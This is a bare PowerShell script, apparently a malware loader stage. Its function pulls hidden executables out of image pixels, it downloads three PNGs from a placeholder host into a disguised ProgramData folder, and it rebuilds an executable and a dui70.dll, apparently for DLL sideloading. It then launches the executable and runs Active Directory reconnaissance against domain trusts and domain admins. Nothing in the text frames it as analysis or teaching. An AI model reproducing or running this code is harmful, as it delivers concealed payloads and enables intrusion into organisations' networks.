function Extract-RawFileFromImage {
    param ([string]$ImagePath, [string]$OutputFilePath)
    Add-Type -AssemblyName System.Drawing
    $bmp = New-Object System.Drawing.Bitmap $ImagePath
    $ms = New-Object System.IO.MemoryStream
    for ($y = 0; $y -lt $bmp.Height; $y++) {
        for ($x = 0; $x -lt $bmp.Width; $x++) {
            $c = $bmp.GetPixel($x, $y)
            $ms.WriteByte([byte]$c.R)
            $ms.WriteByte([byte]$c.G)
            $ms.WriteByte([byte]$c.B)
            $ms.WriteByte([byte]$c.A)
        }
    }
    $allBytes = $ms.ToArray()
    $dataLength = [BitConverter]::ToInt64($allBytes, 0)
    [System.IO.File]::WriteAllBytes($OutputFilePath, $allBytes[8..(7 + $dataLength)])
    $bmp.Dispose()
    $ms.Dispose()
}
$root = 'C:\ProgramData\CacheService'
New-Item -ItemType Directory -Force $root
Invoke-WebRequest -Method POST 'https://images.invalid/one.png' -OutFile "$root\one.png"
Invoke-WebRequest -Method POST 'https://images.invalid/two.png' -OutFile "$root\two.png"
Invoke-WebRequest -Method POST 'https://images.invalid/three.png' -OutFile "$root\three.png"
Extract-RawFileFromImage "$root\one.png" "$root\LockScreenContentServer.exe"
Extract-RawFileFromImage "$root\two.png" "$root\part-a.bin"
Extract-RawFileFromImage "$root\three.png" "$root\part-b.bin"
$a = [System.IO.File]::ReadAllBytes("$root\part-a.bin")
$b = [System.IO.File]::ReadAllBytes("$root\part-b.bin")
[System.IO.File]::WriteAllBytes("$root\dui70.dll", $a + $b)
Start-Process "$root\LockScreenContentServer.exe"
nltest /domain_trusts
net group "domain admins" /domain
